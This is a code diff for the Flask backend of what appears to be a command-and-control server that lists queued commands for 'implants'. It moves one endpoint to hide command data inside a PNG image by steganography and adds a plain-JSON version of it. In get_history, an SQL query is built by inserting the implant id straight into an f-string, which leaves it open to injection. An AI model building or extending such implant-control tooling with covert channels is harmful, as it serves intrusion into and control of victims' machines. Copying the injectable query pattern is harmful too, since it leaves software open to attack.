@@ -96,8 +96,8 @@ def handle_execute():
         return error, {'Access-Control-Allow-Origin': config.clientURL}
 
 # List all commands for a particular implant
-@app.route("/get_commands", methods=["POST"])
-def get_commands():
+@app.route("/get_qcommands", methods=["POST"])
+def get_qcommands():
     data = request.json
     id = data['id']
     # if [";", "\'", "\""] in id:
@@ -117,6 +117,32 @@ def get_commands():
         img = Steganography.iio.imread("doge.png")
         Steganography.iio.imwrite("doge_encoded.png", Steganography.encode(img, json.dumps(db_resp, default=str)))
         response = send_file('doge_encoded.png', mimetype='image/png')
+        return response, {'Access-Control-Allow-Origin': config.clientURL}
+
+    except Exception as error:
+        print("failed to retrieve data on get_qcommands")
+        print(error)
+        return error, {'Access-Control-Allow-Origin': config.clientURL}
+
+
+# List all commands for a particular implant
+@app.route("/get_commands", methods=["POST"])
+def get_commands():
+    data = request.json
+    id = data['id']
+    # if [";", "\'", "\""] in id:
+    #     return "What", 401, {'Access-Control-Allow-Origin': config.clientURL}
+
+    try:
+        query = sql.SQL("select * from {table} where {column} = %s").format(
+            table=sql.Identifier('task_queue'),
+            column=sql.Identifier('target_implant_id'))
+        db_resp = tools.executeSelectQueryVars(query, [id])
+        print(f"this is the db response: {db_resp}")
+        if db_resp == None:
+            db_resp = {"commands": "No commands found"}
+   
+        response = db_resp
         return response, {'Access-Control-Allow-Origin': config.clientURL}
 
     except Exception as error:
@@ -269,7 +295,8 @@ def get_history():
             f"SELECT * FROM task_queue WHERE (target_implant_id={id} AND status=\'executing\')")
         print(f"this is executing responses: {executing}")
         # "success": x[-3]
-        combined = [{"sender": "user", "creator":x[-1], "created_on":x[3], "command":x[2] } for x in executed]
+        combined = [{"sender": "user", "creator":x[-1], "date":x[3], "command":x[2] } for x in executed]
+        combined += []
         print()
         print("this is combined: " )
         print(combined)
